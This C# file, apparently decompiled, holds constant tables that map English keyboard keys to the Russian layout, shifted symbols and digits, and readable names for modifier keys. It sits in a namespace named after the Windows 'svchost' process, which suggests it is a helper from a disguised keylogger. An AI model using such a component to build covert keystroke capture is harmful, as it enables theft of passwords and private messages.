using System.Collections.Generic;
using System.Windows.Forms;

namespace svchost;

internal static class ConstCollections
{
	public static readonly Dictionary<char, char> EngRusDict = new Dictionary<char, char>
	{
		{ 'q', 'й' },
		{ 'w', 'ц' },
		{ 'e', 'у' },
		{ 'r', 'к' },
		{ 't', 'е' },
		{ 'y', 'н' },
		{ 'u', 'г' },
		{ 'i', 'ш' },
		{ 'o', 'щ' },
		{ 'p', 'з' },
		{ '[', 'х' },
		{ ']', 'ъ' },
		{ 'a', 'ф' },
		{ 's', 'ы' },
		{ 'd', 'в' },
		{ 'f', 'а' },
		{ 'g', 'п' },
		{ 'h', 'р' },
		{ 'j', 'о' },
		{ 'k', 'л' },
		{ 'l', 'д' },
		{ ';', 'ж' },
		{
			"'"[0],
			'э'
		},
		{ 'z', 'я' },
		{ 'x', 'ч' },
		{ 'c', 'с' },
		{ 'v', 'м' },
		{ 'b', 'и' },
		{ 'n', 'т' },
		{ 'm', 'ь' },
		{ ',', 'б' },
		{ '.', 'ю' },
		{ '/', '.' },
		{ '`', 'ё' },
		{ 'Q', 'Й' },
		{ 'W', 'Ц' },
		{ 'E', 'У' },
		{ 'R', 'К' },
		{ 'T', 'Е' },
		{ 'Y', 'Н' },
		{ 'U', 'Г' },
		{ 'I', 'Ш' },
		{ 'O', 'Щ' },
		{ 'P', 'З' },
		{ '{', 'Х' },
		{ '}', 'Ъ' },
		{ 'A', 'Ф' },
		{ 'S', 'Ы' },
		{ 'D', 'В' },
		{ 'F', 'А' },
		{ 'G', 'П' },
		{ 'H', 'Р' },
		{ 'J', 'О' },
		{ 'K', 'Л' },
		{ 'L', 'Д' },
		{ ':', 'Ж' },
		{ '"', 'Э' },
		{ 'Z', 'Я' },
		{ 'X', 'Ч' },
		{ 'C', 'С' },
		{ 'V', 'М' },
		{ 'B', 'И' },
		{ 'N', 'Т' },
		{ 'M', 'Ь' },
		{ '<', 'Б' },
		{ '>', 'Ю' },
		{ '?', ',' },
		{ '|', '/' },
		{ '~', 'Ё' },
		{ '@', '"' },
		{ '#', '№' },
		{ '$', ';' },
		{ '^', ':' },
		{ '&', '?' }
	};

	public static readonly Dictionary<char, char> CapitalOems = new Dictionary<char, char>
	{
		{ '[', '{' },
		{ ']', '}' },
		{ ';', ':' },
		{
			"'"[0],
			'"'
		},
		{ ',', '<' },
		{ '.', '>' },
		{ '/', '?' },
		{ '`', '~' },
		{ '-', '_' },
		{ '=', '+' },
		{ '\\', '|' }
	};

	public static readonly Dictionary<char, char> CapitalNums = new Dictionary<char, char>
	{
		{ '1', '!' },
		{ '2', '@' },
		{ '3', '#' },
		{ '4', '$' },
		{ '5', '%' },
		{ '6', '^' },
		{ '7', '&' },
		{ '8', '*' },
		{ '9', '(' },
		{ '0', ')' }
	};

	public static readonly Dictionary<string, string> ServiceKeys = new Dictionary<string, string>
	{
		{ "LControlKey", "Ctrl" },
		{ "RControlKey", "Ctrl" },
		{ "LMenu", "Alt" },
		{ "RMenu", "Alt" },
		{ "LWin", "Win" },
		{ "RWin", "Win" },
		{ "Return", "Enter" },
		{ "Capital", "CapsLock" },
		{ "Back", "Backspace" },
		{ "Next", "PageDown" }
	};

	public static readonly List<Keys> Oems = new List<Keys>
	{
		(Keys)219,
		(Keys)221,
		(Keys)186,
		(Keys)222,
		(Keys)188,
		(Keys)190,
		(Keys)191,
		(Keys)192,
		(Keys)189,
		(Keys)187,
		(Keys)220
	};

	public static readonly List<Keys> Nums = new List<Keys>
	{
		(Keys)48,
		(Keys)49,
		(Keys)50,
		(Keys)51,
		(Keys)52,
		(Keys)53,
		(Keys)54,
		(Keys)55,
		(Keys)56,
		(Keys)57
	};
}
